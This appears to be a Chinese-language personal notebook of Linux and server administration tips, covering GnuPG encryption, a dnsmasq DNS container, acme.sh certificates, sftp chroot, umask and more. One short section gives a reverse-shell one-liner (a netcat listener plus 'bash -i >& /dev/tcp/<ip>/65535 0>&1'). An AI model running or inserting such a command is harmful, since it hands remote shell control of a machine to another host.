# 那些杂七杂八的记录


# GnuPG 加密与解密  
## gpg 对称加密  
加密:  `gpg -c <file>`， 输入两次加密密码，完成后生成文件`<file>.gpg`(加密后源文件保留)  
解密:  `gpg <file>.gpg`, 输入加密密码,正确后生成文件`<file>`(解密后加密文件保留)  
## gpg 非对称加密  
非对称加密/解密文件时，`Server` 生成私钥与公钥，并把公钥发送给`Client`, `Client` 使用公钥加密数据，并把加密后的数据传给`Server` ，`Server` 最后使用自己的私钥解密数据。  

```bash 
# Server: 创建公钥私钥
$> gpg --gen-key   # 需要填写一些东西，可根据需求选择 
## 配置文件介绍
# GPG 配置文件目录:~/.gnupg
# ~/.gnupg/gpg.conf – 配置文件
# ~/.gnupg/trustdb.gpg – 信任库
# ~/.gnupg/pubring.gpg – 公钥库
# ~/.gnupg/secring.gpg – 私钥库 

$> gpg --list-key  # 密钥查看 
$> gpg -a --export <UserID> > ./public-key.pub # Server: 公钥导出 UserID 为公私钥创建时候生成的，即 gpg: 密钥 <UserID> 被标记为绝对信任  
# 将公钥传送到Client上 

# Client: 导入 公钥 
$> gpg --import ./public-key.pub 

# Client: 文件加密 
$> gpg -e -r <UserID> <file> 
<file>.gpg 
# 加密完成后将文件传送至Server 进行解密，此时Client上是不可解密的，要解密需要私钥  
# Server: 文件解密 
$> gpg -d <file>.gpg 
<file> 
```

# DOCKER 创建 DNS SERVER
```bash
$> vim /data/docker/dns/dnsmasq.conf 
#dnsmasq config, for a complete example, see:
#  http://oss.segetech.com/intra/srv/dnsmasq.conf
#log all dns queries
log-queries
#dont use hosts nameservers
no-resolv
#use cloudflare as default nameservers, prefer 1^4
server=8.8.4.4
server=8.8.8.8
strict-order
#serve all .company queries using a specific nameserver
server=/company/10.0.0.1
#explicitly define host-ip mappings
address=/www.example.com/172.16.10.10

$> docker run -d -p 53:53/udp -p 53:53/tcp -p 5380:8080 -v /data/docker/dns/dnsmasq.conf:/etc/dnsmasq.conf --log-opt "max-size=100m" -e "HTTP_USER=root" -e "HTTP_PASS=root" jpillora/dnsmasq


```

# dotnet 环境搭建 
```bash
$> rpm -Uvh https://packages.microsoft.com/config/rhel/7/packages-microsoft-prod.rpm
$> yum install libgdiplus-devel libunwind icu -y 
$> wget https://packages.microsoft.com/rhel/7/prod/dotnet-sdk-2.1.200-rhel-x64.rpm
$> yum install dotnet-sdk-2.1.200-rhel-x64.rpm -y
$> dotnet --info
# supervisor 管理
yum install supervisor -y
# 前端管理样式页面 
/usr/lib/python2.7/site-packages/supervisor/ui/status.html
```

# 在Linux中删除virbr0接口
`virbr0`是`CentOS7`在安装过程中选择了相关虚拟化的服务安装后产生的,实际上好像是没什么卵用的
```bash
$> virsh net-list 
$> virsh net-destroy default 
$> virsh net-undefine default
$> systemctl restart libvirtd.service
```

# Linux 杀毒软件 clamav 
```bash
# 需要安装epel源
$>　yum install clamav-server clamav-data clamav-update clamav-filesystem clamav clamav-scanner-systemd clamav-devel clamav-lib clamav-server-systemd
# 注释掉 /etc/freshclam.conf /etc/clamd.d/scan.conf 中的Example 
# 更新病毒库　
$> /usr/bin/freshclam
# 扫描 
$> clamscan -ri /data --remove  -l /var/log/clamscan.log 

```

# acme.sh 管理免费域名证书 
此处说明两个注意一点设置的`DNS API`密钥的获取，`cloudflare`和`腾讯云`, 其他可直接参看官方说明 [https://github.com/acmesh-official/acme.sh/wiki/dnsapi](https://github.com/acmesh-official/acme.sh/wiki/dnsapi)  
- `cloudflare`：解析的需要创建API 令牌, API令牌权限需要创建 `区域.区域`和`区域.DNS`，区域资源为`所有区域`或者`帐号的所有区域` , 另外需要的`CF_Account_ID`是`url`中包含的那`32`位的字符串.
```bash
# cloudflare 
$> curl  https://get.acme.sh | sh

$> export CF_Token="xxxxx"
$> export CF_Account_ID="xxxxxx"

$> acme.sh --issue -d example.com -d '*.example.com' --dns dns_cf
```

- 腾讯云：腾讯云实际上需要使用的是`dnspod` 的 `id` 和 `token`他们两个是共用的，可以直接用腾讯云帐号登录`dnspod`,进去后获取到`id` 和 `token` 就行了
```bash
# 腾讯云
$> curl  https://get.acme.sh | sh

$> export DP_Id="xxxxx"
$> export DP_Key="xxxxx"

$> acme.sh --issue -d example.com -d '*.example.com' --dns dns_dp
```


# linux 合并文件系统 margerfs 
>[https://wzyboy.im/post/1148.html](https://wzyboy.im/post/1148.html)

>[https://github.com/trapexit/mergerfs](https://github.com/trapexit/mergerfs)  

使用示例: 
```bash
# 挂载到的目录必须为空
# 命令挂载
$> mergerfs -o defaults,allow_other,use_ino,minfreespace=10G,ignorepponrename=true /data01:/data02 /shares

# fstab
$> /etc/fstab
/data01:/data02 /shares fuse.mergerfs defaults,noauto,allow_other,use_ino,minfreespace=10G,ignorepponrename=true 0 0

```

# linux sftp 搭建  
```bash
# 编辑文件 /etc/ssh/sshd_config,末尾添加(新建的用户若仅使用sftp可以不指定可登陆的bash)
# 若想要让sftp更像登陆到了服务器,可配合chroot来控制,当然也可以直接创建账号，但一般不建议
# 
Match Group  www                          # 限制某个组或者某个用户使用以下规则
    ChrootDirectory  /data/sftp    # sftp 限制登陆目录到此处
    ForceCommand internal-sftp            # 仅允许使用sftp 
    X11Forwarding no                      # 禁止x11转发
    AllowTcpForwarding no                 # 禁止 tcp 转发  
```

# 监听本地网卡上没有的IP地址
```bash
# 一般用于 keepalive + nginx 使用
echo 'net.ipv4.ip_nonlocal_bind = 1' >> /etc/sysctl.conf
```

# 腾讯云第二块网卡绑定公网ip
官方文档是有记录的，这儿记录下服务器上的设置  
```bash
# 网卡初始化

DEVICE=eth1
NM_CONTROLLED=yes
ONBOOT=yes
IPADDR=<网卡2IP>
NETMASK=255.255.240.0

# 
echo "10 t1" >> /etc/iproute2/rt_tables
echo "20 t2" >> /etc/iproute2/rt_tables

/usr/sbin/ip route add default dev eth0 via 172.21.0.1 table 10
/usr/sbin/ip route add default dev eth1 via 172.21.0.1 table 20

/usr/sbin/ip rule add from 172.21.2.168 table 10
/usr/sbin/ip rule add from 172.21.2.74 table 20
```

# shell 反弹 
> https://blog.csdn.net/weixin_41082546/article/details/104123131  


```bash 
# 被控端执行  
nc -lvp 65535
# 控制端执行 
bash -i >& /dev/tcp/<被控端ip>/65535 0>&1
```

# nginx 获取cdn真实用户ip 
```conf
# client_real_ip 即为用户真实IP,可直接用于替换 remote_addr 
  map $http_x_forwarded_for  $client_real_ip {
      ""  $remote_addr;
      ~^(?P<firstAddr>[0-9\.]+),?.*$  $firstAddr;
  }

```

# virtualbox - 从主机端口80到VirtualBox端口80的端口转发不起作用 
此次问题实际出现是在`windows`上, 理论上说`linux`下若使用`nat`功能可能也会出现该问题(至于为什么用`nat`,`virtualbox`似乎并不支持桥接网卡,因此要为虚拟机分配物理`ip`似乎就只能在物理机绑定多个`ip`,然后`nat`转发到虚拟机中), `virtualbox`在转发`80`端口时似乎会与物理机的`80`冲突,从而导致转发无效,这个可能是因为我物理机也启用了`IIS`的原因.好吧,以上都是些废话,我也不知道在说些什么,下面看解决方案.
- 解决方案
 1. 我是用的 `windows`的端口转发解决的, `virtualbox`在`nat`的时候转发一个其他端口(比如`8080`)到内部的`80`, 然后在`windows` 在进行一次转发,将绑定的`ip`的`80`端口转发到`8080`上,这样也可以解决,骚操作看 [`windows命令收集`-`端口转发`](/2022/命令收集/#3-windows-端口转发)
 2. 还有个说的是用管理员身份运行`virtualbox`,也可以解决,不过我没有验证过 

 > [https://www.coder.work/article/6503907](https://www.coder.work/article/6503907)


# 服务器默认端口优化 
1. 检查所有非22开启的端口：`netstat -lntp`  
```bash
$> netstat -lntp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      1317/master         
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      1/systemd           
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1569/sshd           
tcp6       0      0 ::1:25                  :::*                    LISTEN      1317/master         
tcp6       0      0 :::111                  :::*                    LISTEN      1/systemd           
tcp6       0      0 :::22                   :::*                    LISTEN      1569/sshd 
```  

2. 查询`/etc/services`下端口对应的服务：`grep -E "25|111/" /etc/services `   
```bash 
$> grep -E "\ 25/|\ 111/" /etc/services 
smtp            25/tcp          mail
smtp            25/udp          mail
sunrpc          111/tcp         portmapper rpcbind      # RPC 4.0 portmapper TCP
sunrpc          111/udp         portmapper rpcbind      # RPC 4.0 portmapper UD
```

3. 检查服务的运行状态(第三列为服务名称)： `systemctl list-unit-files |grep -E "rpcbind|portmapper|mail"`, 若单个端口所映射的服务没有查询到，需要通过运行端口的`pid`去查询他具体是属于那个程序的，然后然后去查询具体的服务启动状态。  
```bash
$> systemctl list-unit-files |grep -E "rpcbind|portmapper|postfix"
postfix.service                               enabled 
rpcbind.service                               enabled 
rpcbind.socket                                enabled 
rpcbind.target                                static  
$> systemctl stop postfix.service rpcbind.service rpcbind.socket     # 关闭启动的服务
$> systemctl disable postfix.service rpcbind.service rpcbind.socket     # 禁用开机启动
```

# linux 下hosts文件和dns服务器的响应顺序
- 通过修改 `/etc/nsswitch.conf` 进行更换 , 更换`/etc/nsswitch.conf: 86`中的`files`和`dns`的顺序即可  

# git 提交类型 

| 类型       | 描述                                                        |
| :--------- | :---------------------------------------------------------- |
| `feat`     | 新增 `feature`                                               |
| `fix`      | 修复 `bug`                                                   |
| `docs`     | 仅仅修改了文档，比如`README`, `CHANGELOG`, `CONTRIBUTE`等等 |
| `style`    | 仅仅修改了空格、格式缩进、都好等等，不改变代码逻辑          |
| `refactor` | 代码重构，没有加新功能或者修复`bug`                           |
| `perf`     | 优化相关，比如提升性能、体验                                |
| `test`     | 测试用例，包括单元测试、集成测试等                          |
| `chore`    | 改变构建流程、或者增加依赖库、工具等                        |
| `revert`   | 回滚到上一个版本                                            |


# linux 通过s3fs挂载七牛云存储
```bash
$> sudo yum install epel-release
$> sudo yum install s3fs-fuse

$> echo AK:SK > /mnt/.passwd-s3fs
$> chmod 600 /mnt/.passwd-s3fs

$> s3fs s3空间名 /mnt/s3fs -o passwd_file=/mnt/.passwd-s3fs -o url=http://s3-cn-north-1.qiniucs.com -o use_path_request_style   # -o dbglevel=info -f -o curldbg # 日志信息

```

# 普通用户校验是否有权限通过docker.sock操作 docker
```
sudo -u zabbix curl --unix-socket /var/run/docker.sock --no-buffer -XGET v1.24/_ping
```

# rdesktop-vrdp 远程桌面工具安装
- rdesktop-vrdp 是 viralbox的一个很好用的远程桌面工具，没有独立包，可从virtualbox下分离出来单独使用 
```
$> sudo dnf install liblzf
$> rpm2cpio VirtualBox-server-6.1.28-1.fc33.x86_64.rpm |cpio -div
$> cp ./usr/bin/rdesktop-vrdp /usr/local/bin/
$> cp -v ./usr/lib64/virtualbox/VBoxRT.so /usr/lib64/
$> ldconfig
$> rdesktop-vrdp -a 16 -g 1900x960 -r clipboard:PRIMARYCLIPBOARD -r disk:floppy=/tmp/ -u administrator <server_ip>:<port> -p<password>
```

# Umask 计算方法 
- 当创建目录时候，`目录创建后的权限` =  `默认目录最大权限(777)` - `umask 权限`  
    - `umask=0022 --> 777 - 022 = 755(目录权限)`  
- 当创建文件时候，若`umask`值所有位数为偶数，则 `文件创建后的权限` = `默认文件最大权限(666)` - `umask权限`  
    - `umask = 0022 --> 666 - 022 = 644(文件权限)`  
- 当创建文件时候，若`umask`值部分或全部为奇数时候，则 `文件创建后的权限` = `默认文件最大权限(666)` - `umask权限` + `umask基数位+1`  
    - `umask = 0045 --> 666 - 045 = (621 + 001) = 622`  
    - `umask = 0033 --> 666 - 033 = (633 + 011) = 644`  

# 输入输出重定向  

## 文件描述符    
|文件描述符|文件名|类型|硬件|
|-|-|-|-|
|`0`|`stdin`|标准输入文件|键盘|
|`1`|`stdout`|标准输出文件|显示器|
|`2`|`stderr`|标准错误输出文件|显示器|

## 标准重定向 
>[https://aimuke.github.io/linux/2019/05/29/redirect/](https://aimuke.github.io/linux/2019/05/29/redirect/)  

|类型|表现形式|
|-|-|
|标准输入重定向|`0<`或`<`|
|追加输入重定向|`0<<`或`<`|
|标准输出重定向|`1>`或`>`|
|标准输出追加重定向|`1>>`或`>>`|
|标准错误重定向|`2>`|
|标准错误追加重定向|`2>>`|
|标准错误重定向到标准输出|`2>&1`，`(cmd > /dev/null 2>&1) == (cmd >& /dev/null) == (cmd &> /dev/null)`|


# linux 下挂载 esxi 的 vmfs 文件系统 
`vmfs` 是`esxi`的文件系统,物理机使用`esxi`虚拟化后硬盘的文件格式就是这个. `linux`下可以直接将其挂在到本地
`vmfs-tools`是`linux`挂载`vmfs`的驱动程序(应该也可以挂在`vmdk`文件,*我没有试过*),默认在`ubuntu`上已获得支持,`fedora`上可以直接将`ubuntu`上的安装程序复制过来也可以直接使用. 

> https://github.com/glandium/vmfs-tools 

```bash
# 安装后挂载  
vmfs-fuse /dev/sdc1 /mnt/sdc 
```

# cp mv 进度条补丁
```bash
# 注意尽量不要使用 root 用户操作
# 下载coreutils
$ wget http://ftp.gnu.org/gnu/coreutils/coreutils-8.32.tar.xz
$ tar -xJf coreutils-8.32.tar.xz
$ cd coreutils-8.32/

# 下载 github 上的补丁
$ wget https://raw.githubusercontent.com/jarun/advcpmv/master/advcpmv-0.8-8.32.patch
# 打补丁，实现进度条显示
$ patch -p1 -i advcpmv-0.8-8.32.patch
patching file src/copy.c
patching file src/copy.h
patching file src/cp.c
patching file src/mv.c

# 编译安装
$ ./configure
$ make
# 将打补丁生成的cp和mv命令的二进制文件复制到bin目录下
$ sudo cp src/cp /usr/local/bin/cp
$ sudo cp src/mv /usr/local/bin/mv
```

# 更改docker容器中的时间而不影响宿主机 
```bash
$> git clone https://github.com/wolfcw/libfaketime.git
$> cd libfaketime
$> make 
$> docker cp ./src/libfaketime.so.1 centos:/usr/lib/
$> docker exec -it centos bash 
# 修改为指定时间
$>> export LD_PRELOAD=/usr/lib/libfaketime.so.1 FAKETIME="2020-05-01 00:01:00"
# 修改为几天后 
$>> export LD_PRELOAD=/usr/lib/libfaketime.so.1 FAKETIME="+2d"
# 恢复 
$>> export LD_PRELOAD=
```

# ubuntu/debian切换shell（dash/bash）
```bash
$> dpkg-reconfigure dash
# 弹出窗口选择 <No>
```
